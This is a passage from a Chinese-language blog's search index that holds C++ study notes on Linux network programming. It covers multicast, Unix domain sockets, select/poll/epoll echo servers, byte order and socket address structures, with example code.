&amp;imr_multiaddr.s_addr); setsockopt(fd, IPPROTO_IP, IP_MULTICAST_IF, &amp;imr_multiaddr, sizeof(imr_multiaddr)); //3.初始化客户端地址信息 struct sockaddr_in cliaddr; cliaddr.sin_family = AF_INET; cliaddr.sin_port = htons(9999); inet_pton(AF_INET, &quot;239.0.0.10&quot;, &amp;cliaddr.sin_addr.s_addr); // 4.通信 int num = 0; while (1) &#123; char sendBuf[128]; sprintf(sendBuf, &quot;hello , client......%d\\n&quot;, num++); // 发送数据 sendto(fd, sendBuf, strlen(sendBuf) + 1, 0, (struct sockaddr*)&amp;cliaddr, sizeof(cliaddr)); printf(&quot;组播的数据： %s\\n&quot;, sendBuf); sleep(1); &#125; close(fd); return 0;&#125; client 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123; // 1.创建一个通信的socket int fd = socket(PF_INET, SOCK_DGRAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; // 2.客户端绑定本地的IP和端口 struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(9999); addr.sin_addr.s_addr = INADDR_ANY; int ret = bind(fd, (struct sockaddr*)&amp;addr, sizeof(addr)); if (ret == -1) &#123; perror(&quot;bind&quot;); exit(-1); &#125; struct ip_mreq op; inet_pton(AF_INET, &quot;239.0.0.10&quot;, &amp;op.imr_multiaddr.s_addr); op.imr_interface.s_addr = INADDR_ANY; //加入到多播组 setsockopt(fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &amp;op, sizeof(op)); // 3.通信 while (1) &#123; char buf[128]; // 接收数据 int num = recvfrom(fd, buf, sizeof(buf), 0, NULL, NULL); printf(&quot;server say : %s\\n&quot;, buf); &#125; close(fd); return 0;&#125; 本地套接字通信本地套接字的作用：本地的进程间通信 有关系的进程间的通信（父子进程） 没有关系的进程间的通信 本地套接字实现流程和网络套接字类似，一般呢采用TCP的通信流程。 123456789101112131415161718192021222324252627282930313233// 本地套接字通信的流程 - tcp// 服务器端1. 创建监听的套接字int lfd = socket(AF_UNIX/AF_LOCAL, SOCK_STREAM, 0);2. 监听的套接字绑定本地的套接字文件 -&gt; server端struct sockaddr_un addr;// 绑定成功之后，指定的sun_path中的套接字文件会自动生成。bind(lfd, addr, len);3. 监听listen(lfd, 100);4. 等待并接受连接请求struct sockaddr_un cliaddr;int cfd = accept(lfd, &amp;cliaddr, len);5. 通信接收数据：read/recv发送数据：write/send6. 关闭连接close();// 客户端的流程1. 创建通信的套接字int fd = socket(AF_UNIX/AF_LOCAL, SOCK_STREAM, 0);2. 监听的套接字绑定本地的IP 端口struct sockaddr_un addr;// 绑定成功之后，指定的sun_path中的套接字文件会自动生成。bind(lfd, addr, len);3. 连接服务器struct sockaddr_un serveraddr;connect(fd, &amp;serveraddr, sizeof(serveraddr));4. 通信接收数据：read/recv发送数据：write/send5. 关闭连接close(); 案例 server 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/un.h&gt;int main() &#123; unlink(&quot;server.sock&quot;); // 1.创建监听的套接字 int lfd = socket(AF_LOCAL, SOCK_STREAM, 0); if(lfd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; // 2.绑定本地套接字文件 struct sockaddr_un addr; addr.sun_family = AF_LOCAL; strcpy(addr.sun_path, &quot;server.sock&quot;); int ret = bind(lfd, (struct sockaddr *)&amp;addr, sizeof(addr)); if(ret == -1) &#123; perror(&quot;bind&quot;); exit(-1); &#125; // 3.监听 ret = listen(lfd, 100); if(ret == -1) &#123; perror(&quot;listen&quot;); exit(-1); &#125; // 4.等待客户端连接 struct sockaddr_un cliaddr; int len = sizeof(cliaddr); int cfd = accept(lfd, (struct sockaddr *)&amp;cliaddr, &amp;len); if(cfd == -1) &#123; perror(&quot;accept&quot;); exit(-1); &#125; printf(&quot;client socket filename: %s\\n&quot;, cliaddr.sun_path); // 5.通信 while(1) &#123; char buf[128]; int len = recv(cfd, buf, sizeof(buf), 0); if(len == -1) &#123; perror(&quot;recv&quot;); exit(-1); &#125; else if(len == 0) &#123; printf(&quot;client closed....\\n&quot;); break; &#125; else if(len &gt; 0) &#123; printf(&quot;client say : %s\\n&quot;, buf); send(cfd, buf, len, 0); &#125; &#125; close(cfd); close(lfd); return 0;&#125; client 1","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"网络编程","slug":"编程语言/C/网络编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++ 学习 网络编程 IO多路复用","slug":"C++-学习-网络编程-IO多路复用","date":"2023-05-25T05:54:32.000Z","updated":"2023-06-03T08:53:51.285Z","comments":true,"path":"2023/05/25/C++-学习-网络编程-IO多路复用/","link":"","permalink":"http://example.com/2023/05/25/C++-%E5%AD%A6%E4%B9%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/","excerpt":"I&#x2F;O多路复用（I&#x2F;O多路转接）","text":"I&#x2F;O多路复用（I&#x2F;O多路转接） I&#x2F;O 多路复用使得程序能同时监听多个文件描述符，能够提高程序的性能，Linux 下实现 I&#x2F;O 多路复用的系统调用主要有 select、poll 和 epoll。 select主旨思想 首先要构造一个关于文件描述符的列表，将要监听的文件描述符添加到该列表中。 调用一个系统函数，监听该列表中的文件描述符，直到这些描述符中的一个或者多个进行了I&#x2F;O操作时，该函数才返回。 这个函数是阻塞 函数对文件描述符的检测的操作是由内核完成的 在返回时，它会告诉进程有多少描述符要进行I&#x2F;O操作。 123456789101112131415161718192021222324252627282930313233343536// sizeof(fd_set) = 128 1024#include &lt;sys/time.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/select.h&gt;int select(int nfds, fd_set *readfds, fd_set *writefds,fd_set *exceptfds, struct timeval *timeout);- 参数：- nfds : 委托内核检测的最大文件描述符的值 + 1- readfds : 要检测的文件描述符的读的集合，委托内核检测哪些文件描述符的读的属性- 一般检测读操作- 对应的是对方发送过来的数据，因为读是被动的接收数据，检测的就是读缓冲区- 是一个传入传出参数- writefds : 要检测的文件描述符的写的集合，委托内核检测哪些文件描述符的写的属性- 委托内核检测写缓冲区是不是还可以写数据（不满的就可以写）- exceptfds : 检测发生异常的文件描述符的集合- timeout : 设置的超时时间struct timeval &#123;long tv_sec; /* seconds */long tv_usec; /* microseconds */&#125;;- NULL : 永久阻塞，直到检测到了文件描述符有变化- tv_sec = 0 tv_usec = 0， 不阻塞- tv_sec &gt; 0 tv_usec &gt; 0， 阻塞对应的时间- 返回值 :- -1 : 失败- &gt;0(n) : 检测的集合中有n个文件描述符发生了变化// 将参数文件描述符fd对应的标志位设置为0void FD_CLR(int fd, fd_set *set);// 判断fd对应的标志位是0还是1， 返回值 ： fd对应的标志位的值，0，返回0， 1，返回1int FD_ISSET(int fd, fd_set *set);// 将参数文件描述符fd 对应的标志位，设置为1void FD_SET(int fd, fd_set *set);// fd_set一共有1024 bit, 全部初始化为0void FD_ZERO(fd_set *set); 工作过程分析 select代码编写server 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/select.h&gt;int main() &#123; // 创建socket int lfd = socket(PF_INET, SOCK_STREAM, 0); struct sockaddr_in saddr; saddr.sin_port = htons(9999); saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; // 绑定 bind(lfd, (struct sockaddr*)&amp;saddr, sizeof(saddr)); // 监听 listen(lfd, 8); // 创建一个fd_set的集合，存放的是需要检测的文件描述符 fd_set rdset, tmp; FD_ZERO(&amp;rdset); FD_SET(lfd, &amp;rdset); int maxfd = lfd; while (1) &#123; tmp = rdset; // 调用select系统函数，让内核帮检测哪些文件描述符有数据 int ret = select(maxfd + 1, &amp;tmp, NULL, NULL, NULL); if (ret == -1) &#123; perror(&quot;select&quot;); exit(-1); &#125; else if (ret == 0) &#123; continue; &#125; else if (ret &gt; 0) &#123; // 说明检测到了有文件描述符的对应的缓冲区的数据发生了改变 if (FD_ISSET(lfd, &amp;tmp)) &#123; // 表示有新的客户端连接进来了 struct sockaddr_in cliaddr; int len = sizeof(cliaddr); int cfd = accept(lfd, (struct sockaddr*)&amp;cliaddr, &amp;len); // 将新的文件描述符加入到集合中 FD_SET(cfd, &amp;rdset); // 更新最大的文件描述符 maxfd = maxfd &gt; cfd ? maxfd : cfd; &#125; for (int i = lfd + 1; i &lt;= maxfd; i++) &#123; if (FD_ISSET(i, &amp;tmp)) &#123; // 说明这个文件描述符对应的客户端发来了数据 char buf[1024] = &#123; 0 &#125;; int len = read(i, buf, sizeof(buf)); if (len == -1) &#123; perror(&quot;read&quot;); exit(-1); &#125; else if (len == 0) &#123; printf(&quot;client closed...\\n&quot;); close(i); FD_CLR(i, &amp;rdset); &#125; else if (len &gt; 0) &#123; printf(&quot;read buf = %s\\n&quot;, buf); write(i, buf, strlen(buf) + 1); &#125; &#125; &#125; &#125; &#125; close(lfd); return 0;&#125; client 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;int main() &#123; // 创建socket int fd = socket(PF_INET, SOCK_STREAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); return -1; &#125; struct sockaddr_in seraddr; inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;seraddr.sin_addr.s_addr); seraddr.sin_family = AF_INET; seraddr.sin_port = htons(9999); // 连接服务器 int ret = connect(fd, (struct sockaddr*)&amp;seraddr, sizeof(seraddr)); if (ret == -1) &#123; perror(&quot;connect&quot;); return -1; &#125; int num = 0; while (1) &#123; char sendBuf[1024] = &#123; 0 &#125;; sprintf(sendBuf, &quot;send data %d&quot;, num++); write(fd, sendBuf, strlen(sendBuf) + 1); // 接收 int len = read(fd, sendBuf, sizeof(sendBuf)); if (len == -1) &#123; perror(&quot;read&quot;); return -1; &#125; else if (len &gt; 0) &#123; printf(&quot;read buf = %s\\n&quot;, sendBuf); &#125; else &#123; printf(&quot;服务器已经断开连接...\\n&quot;); break; &#125; // sleep(1); usleep(1000); &#125; close(fd); return 0;&#125; pollselect的缺点 poll12345678910111213141516171819202122#include &lt;poll.h&gt;struct pollfd &#123; int fd; /* 委托内核检测的文件描述符 */ short events; /* 委托内核检测文件描述符的什么事件 */ short revents; /* 文件描述符实际发生的事件 */&#125;;struct pollfd myfd;myfd.fd = 5;myfd.events = POLLIN | POLLOUT;//既要读也要写int poll(struct pollfd* fds, nfds_t nfds, int timeout);// -参数：// - fds : 是一个struct pollfd 结构体数组，这是一个需要检测的文件描述符的集合// - nfds : 这个是第一个参数数组中最后一个有效元素的下标 + 1// - timeout : 阻塞时长// 0 : 不阻塞// - 1 : 阻塞，当检测到需要检测的文件描述符有变化，解除阻塞// &gt; 0 : 阻塞的时长// - 返回值：// - 1 : 失败// &gt; 0（n） : 成功, n表示检测到集合中有n个文件描述符发生变化 案例server 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/select.h&gt;#include &lt;poll.h&gt;int main() &#123; // 创建socket int lfd = socket(PF_INET, SOCK_STREAM, 0); struct sockaddr_in saddr; saddr.sin_port = htons(9999); saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; // 绑定 bind(lfd, (struct sockaddr*)&amp;saddr, sizeof(saddr)); // 监听 listen(lfd, 8); //初始化检测的文件描述符数组 struct pollfd fds[1024]; for (int i = 0;i &lt; 1024;i++) &#123; fds[i].fd = -1; fds[i].events = POLLIN; &#125; fds[0].fd = lfd; int nfds = 0; while (1) &#123; // 调用poll系统函数，让内核帮检测哪些文件描述符有数据 int ret = poll(fds, nfds + 1, -1); if (ret == -1) &#123; perror(&quot;poll&quot;); exit(-1); &#125; else if (ret == 0) &#123; continue; &#125; else if (ret &gt; 0) &#123; // 说明检测到了有文件描述符的对应的缓冲区的数据发生了改变 if (fds[0].revents &amp; POLLIN) &#123; // 表示有新的客户端连接进来了 struct sockaddr_in cliaddr; int len = sizeof(cliaddr); int cfd = accept(lfd, (struct sockaddr*)&amp;cliaddr, &amp;len); // 将新的文件描述符加入到集合中 for (int i = 1;i &lt; 1024;i++) &#123; if (fds[i].fd == -1) &#123; fds[i].fd = cfd; fds[i].events = POLLIN; break; &#125; &#125; // 更新最大的文件描述符 nfds = nfds &gt; cfd ? nfds : cfd; &#125; for (int i = 1; i &lt;= nfds; i++) &#123; if (fds[i].revents &amp; POLLIN) &#123; // 说明这个文件描述符对应的客户端发来了数据 char buf[1024] = &#123; 0 &#125;; int len = read(fds[i].fd, buf, sizeof(buf)); if (len == -1) &#123; perror(&quot;read&quot;); exit(-1); &#125; else if (len == 0) &#123; printf(&quot;client closed...\\n&quot;); close(i); fds[i].fd = -1; &#125; else if (len &gt; 0) &#123; printf(&quot;read buf = %s\\n&quot;, buf); write(fds[i].fd, buf, strlen(buf) + 1); &#125; &#125; &#125; &#125; &#125; close(lfd); return 0;&#125; epollepoll()多路复用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;sys/epoll.h&gt;// 创建一个新的epoll实例。在内核中创建了一个数据，这个数据中有两个比较重要的数据，一个是需要检// 测的文件描述符的信息（红黑树），还有一个是就绪列表，存放检测到数据发送改变的文件描述符信息（双向// 链表）。int epoll_create(int size);// -参数：// size : 目前没有意义了。随便写一个数，必须大于0// - 返回值：// - 1 : 失败// &gt; 0 : 文件描述符，操作epoll实例的typedef union epoll_data &#123; void* ptr; int fd; uint32_t u32; uint64_t u64;&#125; epoll_data_t;struct epoll_event &#123; uint32_t events; /* Epoll events */ epoll_data_t data; /* User data variable */&#125;;// 常见的Epoll检测事件：// - EPOLLIN// - EPOLLOUT// - EPOLLERR// 对epoll实例进行管理：添加文件描述符信息，删除信息，修改信息int epoll_ctl(int epfd, int op, int fd, struct epoll_event* event);// -参数：// - epfd : epoll实例对应的文件描述符// - op : 要进行什么操作// EPOLL_CTL_ADD : 添加// EPOLL_CTL_MOD : 修改// EPOLL_CTL_DEL : 删除// - fd : 要检测的文件描述符// - event : 检测文件描述符什么事情// 检测函数int epoll_wait(int epfd, struct epoll_event* events, int maxevents, int timeout);// -参数：// - epfd : epoll实例对应的文件描述符// - events : 传出参数，保存了发送了变化的文件描述符的信息// - maxevents : 第二个参数结构体数组的大小// - timeout : 阻塞时间// - 0 : 不阻塞// - -1 : 阻塞，直到检测到fd数据发生变化，解除阻塞// - &gt; 0 : 阻塞的时长（毫秒）// - 返回值：// - 成功，返回发送变化的文件描述符的个数 &gt; 0// - 失败 - 1 案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/epoll.h&gt;int main() &#123; // 创建socket int lfd = socket(PF_INET, SOCK_STREAM, 0); struct sockaddr_in saddr; saddr.sin_port = htons(9999); saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; // 绑定 bind(lfd, (struct sockaddr*)&amp;saddr, sizeof(saddr)); // 监听 listen(lfd, 8); // 调用epoll_create()创建一个epoll实例 int epfd = epoll_create(100); // 将监听的文件描述符相关的检测信息添加到epoll实例中 struct epoll_event epev; epev.events = EPOLLIN; epev.data.fd = lfd; epoll_ctl(epfd, EPOLL_CTL_ADD, lfd, &amp;epev); struct epoll_event epevs[1024]; while (1) &#123; int ret = epoll_wait(epfd, epevs, 1024, -1); if (ret == -1) &#123; perror(&quot;epoll_wait&quot;); exit(-1); &#125; printf(&quot;ret = %d\\n&quot;, ret); for (int i = 0; i &lt; ret; i++) &#123; int curfd = epevs[i].data.fd; if (curfd == lfd) &#123; // 监听的文件描述符有数据达到，有客户端连接 struct sockaddr_in cliaddr; int len = sizeof(cliaddr); int cfd = accept(lfd, (struct sockaddr*)&amp;cliaddr, &amp;len); epev.events = EPOLLIN; epev.data.fd = cfd; epoll_ctl(epfd, EPOLL_CTL_ADD, cfd, &amp;epev); &#125; else &#123; if (epevs[i].events &amp; EPOLLOUT) &#123; continue; &#125; // 有数据到达，需要通信 char buf[1024] = &#123; 0 &#125;; int len = read(curfd, buf, sizeof(buf)); if (len == -1) &#123; perror(&quot;read&quot;); exit(-1); &#125; else if (len == 0) &#123; printf(&quot;client closed...\\n&quot;); epoll_ctl(epfd, EPOLL_CTL_DEL, curfd, NULL); close(curfd); &#125; else if (len &gt; 0) &#123; printf(&quot;read buf = %s\\n&quot;, buf); write(curfd, buf, strlen(buf) + 1); &#125; &#125; &#125; &#125; close(lfd); close(epfd); return 0;&#125; epoll的两种工作模式LT模式（水平触发）在水平触发模式下，当文件描述符（例如，socket）的缓冲区有数据可读时，Epoll 会通知用户。如果用户不处理这些数据（不读取），Epoll 会持续通知用户。用户可以选择读取全部数据，部分数据，或者不读取数据，但是只要缓冲区中还有数据，Epoll 就会一直通知用户。 LT（level - triggered）是缺省的工作方式，并且同时支持 block 和 no-block socket。在这种做法中，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的 fd 进行 IO 操作。如果你不作任何操作，内核还是会继续通知你的。 ET模式（边沿触发）边沿触发模式与水平触发模式的主要区别在于，Epoll 仅在事件发生时通知用户一次。例如，当文件描述符的缓冲区有数据可读时，Epoll 会通知用户。如果用户不读取数据，那么下次 Epoll 检测到还有数据可读时，就不会再通知用户。用户需要在收到通知后尽可能地读取缓冲区中的全部数据，否则可能错过某些事件。 简单来说，边沿触发模式是当条件由不满足变为满足时（例如，从无数据可读变为有数据可读），Epoll 仅通知用户一次。用户需要在收到通知后尽快处理事件，否则可能错过后续的通知。这种模式通常适用于非阻塞的 socket。 总结一下，水平触发模式（LT）会在事件满足条件时持续通知用户，而边沿触发模式（ET）仅在事件发生时通知用户一次。在实际应用中，根据不同的使用场景和需求，可以灵活选择这两种模式。 ET（edge - triggered）是高速工作方式，只支持 no-block socket。在这种模式下，当描述符从未就绪变为就绪时，内核通过epoll告诉你。然后它会假设你知道文件描述符已经就绪，并且不会再为那个文件描述符发送更多的就绪通知，直到你做了某些操作导致那个文件描述符不再为就绪状态了。但是请注意，如果一直不对这个 fd 作 IO 操作（从而导致它再次变成未就绪），内核不会发送更多的通知（only once）。ET 模式在很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。epoll工作在 ET 模式的时候，必须使用非阻塞套接口，以避免由于一个文件句柄的阻塞读&#x2F;阻塞写操作把处理多个文件描述符的任务饿死。 1","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"网络编程","slug":"编程语言/C/网络编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"C++学习 网络编程 socket通信基础","slug":"C++-学习-网络编程-socket通信基础","date":"2023-05-20T07:04:08.000Z","updated":"2023-05-23T14:13:15.220Z","comments":true,"path":"2023/05/20/C++-学习-网络编程-socket通信基础/","link":"","permalink":"http://example.com/2023/05/20/C++-%E5%AD%A6%E4%B9%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-socket%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80/","excerpt":"socket介绍 所谓 socket（套接字），就是对网络中不同主机上的应用进程之间进行双向通信的端点的抽象。一个套接字就是网络上进程通信的一端，提供了应用层进程利用网络协议交换数据的机制。从所处的地位来讲，套接字上联应用进程，下联网络协议栈，是应用程序通过网络协议进行通信的接口，是应用程序与网络协议根进行交互的接口。 socket 可以看成是两个网络应用程序进行通信时，各自通信连接中的端点，这是一个逻辑上的概念。它是网络环境中进程间通信的 API，也是可以被命名和寻址的通信端点，使用中的每一个套接字都有其类型和一个与之相连进程。通信时其中一个网络应用程序将要传输的一段信息写入它所在主机的 socket 中，该 socket 通过与网络接口卡（NIC）相连的传输介质将这段信息送到另外一台主机的 socket 中，使对方能够接收到这段信息。socket 是由 IP 地址和端口结合的，提供向应用层进程传送数据包的机制。 socket 本身有“插座”的意思，在 Linux 环境下，用于表示进程间网络通信的特殊文件类型。本质为内核借助缓冲区形成的伪文件。既然是文件，那么理所当然的，我们可以使用文件描述符引用套接字。与管道类似的，Linux 系统将其封装成文件的目的是为了统一接口，使得读写套接字和读写文件的操作一致。区别是管道主要应用于本地进程间通信，而套接字多应用于网络进程间数据的传递。 套接字通信分为两部分","text":"socket介绍 所谓 socket（套接字），就是对网络中不同主机上的应用进程之间进行双向通信的端点的抽象。一个套接字就是网络上进程通信的一端，提供了应用层进程利用网络协议交换数据的机制。从所处的地位来讲，套接字上联应用进程，下联网络协议栈，是应用程序通过网络协议进行通信的接口，是应用程序与网络协议根进行交互的接口。 socket 可以看成是两个网络应用程序进行通信时，各自通信连接中的端点，这是一个逻辑上的概念。它是网络环境中进程间通信的 API，也是可以被命名和寻址的通信端点，使用中的每一个套接字都有其类型和一个与之相连进程。通信时其中一个网络应用程序将要传输的一段信息写入它所在主机的 socket 中，该 socket 通过与网络接口卡（NIC）相连的传输介质将这段信息送到另外一台主机的 socket 中，使对方能够接收到这段信息。socket 是由 IP 地址和端口结合的，提供向应用层进程传送数据包的机制。 socket 本身有“插座”的意思，在 Linux 环境下，用于表示进程间网络通信的特殊文件类型。本质为内核借助缓冲区形成的伪文件。既然是文件，那么理所当然的，我们可以使用文件描述符引用套接字。与管道类似的，Linux 系统将其封装成文件的目的是为了统一接口，使得读写套接字和读写文件的操作一致。区别是管道主要应用于本地进程间通信，而套接字多应用于网络进程间数据的传递。 套接字通信分为两部分 服务器端：被动接受连接，一般不会主动发起连接 客户端：主动向服务器发起连接 socket是一套通信的接口，Linux 和 Windows 都有，但是有一些细微的差别 字节序简介 现代 CPU 的累加器一次都能装载（至少）4 字节（这里考虑 32 位机），即一个整数。那么这 4字节在内存中排列的顺序将影响它被累加器装载成的整数的值，这就是字节序问题。在各种计算机体系结构中，对于字节、字等的存储机制有所不同，因而引发了计算机通信领域中一个很重要的问题，即通信双方交流的信息单元（比特、字节、字、双字等等）应该以什么样的顺序进行传送。如果不达成一致的规则，通信双方将无法进行正确的编码&#x2F;译码从而导致通信失败。 字节序，顾名思义字节的顺序，就是大于一个字节类型的数据在内存中的存放顺序(一个字节的数据当然就无需谈顺序的问题了)。 字节序分为大端字节序（Big-Endian） 和小端字节序（Little-Endian）。大端字节序是指一个整数的最高位字节（23 ~ 31 bit）存储在内存的低地址处，低位字节（0 ~ 7 bit）存储在内存的高地址处；小端字节序则是指整数的高位字节存储在内存的高地址处，而低位字节则存储在内存的低地址处。 字节序举例 字节(从高到低)：0x 01 02 03 04 12 34 56 78 小端字节序，增长方向由低到高 大端字节序，增长方向由低到高 案例 123456789101112131415161718192021222324252627282930//字节序：字节在内存中存储的顺序//小端字节序：数据的高位字节存储在内存的高位地址，低位字节存储在内存的低位地址//大端字节序：数据的低位字节存储在内存的高位地址，高位字节存储在内存的低位地址//通过代码检测当前主机的字节序#include&lt;stdio.h&gt;int main()&#123; union &#123; short value; char bytes[sizeof(short)]; // char[2] &#125;test; test.value = 0x0102; if ((test.bytes[0] == 1) &amp;&amp; (test.bytes[1] == 2)) &#123; printf(&quot;大端字节序\\n&quot;); &#125; else if ((test.bytes[0] == 2) &amp;&amp; (test.bytes[1] == 1)) &#123; printf(&quot;小端字节序\\n&quot;); &#125; else &#123; printf(&quot;未知\\n&quot;); &#125;&#125; 编译运行结果为小段字节序 字节序转换 当格式化的数据在两台使用不同字节序的主机之间直接传递时，接收端必然错误的解释之。解决问题的方法是：发送端总是把要发送的数据转换成大端字节序数据后再发送，而接收端知道对方传送过来的数据总是采用大端字节序，所以接收端可以根据自身采用的字节序决定是否对接收到的数据进行转换（小端机转换，大端机不转换）。 网络字节顺序是 TCP&#x2F;IP 中规定好的一种数据表示格式，它与具体的 CPU 类型、操作系统等无关，从而可以保证数据在不同主机之间传输时能够被正确解释，网络字节顺序采用大端排序方式。 BSD Socket提供了封装好的转换接口，方便程序员使用。包括从主机字节序到网络字节序的转换函数：htons、htonl；从网络字节序到主机字节序的转换函数：ntohs、ntohl。 12345h - host 主机，主机字节序to - 转换成什么n - network 网络字节序s - short unsigned shortl - long unsigned int 123456789#include &lt;arpa/inet.h&gt;//网络通信时，需要将主机字节序转换成网络字节序（大端）//另外一段获取到数据以后根据情况将网络字节序转换成主机字节序// 转换端口uint16_t htons(uint16_t hostshort); // 主机字节序 - 网络字节序uint16_t ntohs(uint16_t netshort); // 主机字节序 - 网络字节序// 转IPuint32_t htonl(uint32_t hostlong); // 主机字节序 - 网络字节序uint32_t ntohl(uint32_t netlong); // 主机字节序 - 网络字节序 案例 1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;#include&lt;arpa/inet.h&gt;int main()&#123; //htons 转换端口 unsigned short a = 0x0102; printf(&quot;%x\\n&quot;, a); unsigned short b = htons(a); printf(&quot;%x\\n&quot;, b); printf(&quot;-------------------------------\\n&quot;); //htonl 转换IP char buf[4] = &#123; 192,168,1,100 &#125;; int num = *(int*)buf; int sum = htonl(num); unsigned char* p = (char*)∑ printf(&quot;%d %d %d %d\\n&quot;, *p, *(p + 1), *(p + 2), *(p + 3)); printf(&quot;-------------------------------\\n&quot;); //ntohl 转换IP unsigned char buf1[4] = &#123; 1,1,168,192 &#125;; int num1 = *(int*)buf1; int sum1 = ntohl(num1); unsigned char* p1 = (unsigned char*)&amp;sum1; printf(&quot;%d %d %d %d\\n&quot;, *p1, *(p1 + 1), *(p1 + 2), *(p1 + 3)); //ntohs } 编译运行 socket地址 socket地址其实是一个结构体，封装端口号和IP等信息。后面的socket相关的api中需要使用到这个socket地址。 客户端 -&gt; 服务器（IP, Port） 通用socket地址socket 网络编程接口中表示 socket 地址的是结构体 sockaddr，其定义如下： 123456#include &lt;bits/socket.h&gt;struct sockaddr &#123;sa_family_t sa_family;char sa_data[14];&#125;;typedef unsigned short int sa_family_t sa_family 成员是地址族类型（sa_family_t）的变量。地址族类型通常与协议族类型对应。常见的协议族（protocol family，也称 domain）和对应的地址族入下所示： 协议族 地址族 描述 PF_UNIX AF_UNIX UNIX本地域协议族 PF_INET AF_INET TCP&#x2F;IPv4协议族 PF_INET6 AF_INET6 TCP&#x2F;IPv6协议族 宏 PF_* 和 AF_* 都定义在 bits&#x2F;socket.h 头文件中，且后者与前者有完全相同的值，所以二者通常混用。 sa_data 成员用于存放 socket 地址值。但是，不同的协议族的地址值具有不同的含义和长度，如下所示： 协议族 地址值含义和长度 PF_UNIX 文件的路径名，长度可达到108字节 PF_INET 16bit端口号和32bit IPv4地址，共6字节 PF_INET6 16bit端口号，32bit流标识，128bit IPv6地址，32bit 范围ID，共26字节 由上表可知，14 字节的 sa_data 根本无法容纳多数协议族的地址值。因此，Linux 定义了下面这个新的通用的 socket 地址结构体，这个结构体不仅提供了足够大的空间用于存放地址值，而且是内存对齐的。 12345678#include &lt;bits/socket.h&gt;struct sockaddr_storage&#123;sa_family_t sa_family;unsigned long int __ss_align;char __ss_padding[ 128 - sizeof(__ss_align) ];&#125;;typedef unsigned short int sa_family_t; 专用socket地址很多网络编程函数诞生早于 IPv4 协议，那时候都使用的是 struct sockaddr 结构体，为了向前兼容，现在sockaddr 退化成了（void *）的作用，传递一个地址给函数，至于这个函数是 sockaddr_in 还是sockaddr_in6，由地址族确定，然后函数内部再强制类型转化为所需的地址类型。 UNIX 本地域协议族使用如下专用的 socket 地址结构体： 123456#include &lt;sys/un.h&gt;struct sockaddr_un&#123;sa_family_t sin_family;char sun_path[108];&#125;; TCP&#x2F;IP 协议族有 sockaddr_in 和 sockaddr_in6 两个专用的 socket 地址结构体，它们分别用于 IPv4 和IPv6： 123456789101112131415161718192021222324252627#include &lt;netinet/in.h&gt;struct sockaddr_in&#123;sa_family_t sin_family; /* __SOCKADDR_COMMON(sin_) *///地址族类型in_port_t sin_port; /* Port number. *///端口号struct in_addr sin_addr; /* Internet address. *///IP地址/* Pad to size of `struct sockaddr&#x27;. *///填充部分unsigned char sin_zero[sizeof (struct sockaddr) - __SOCKADDR_COMMON_SIZE -sizeof (in_port_t) - sizeof (struct in_addr)];&#125;;struct 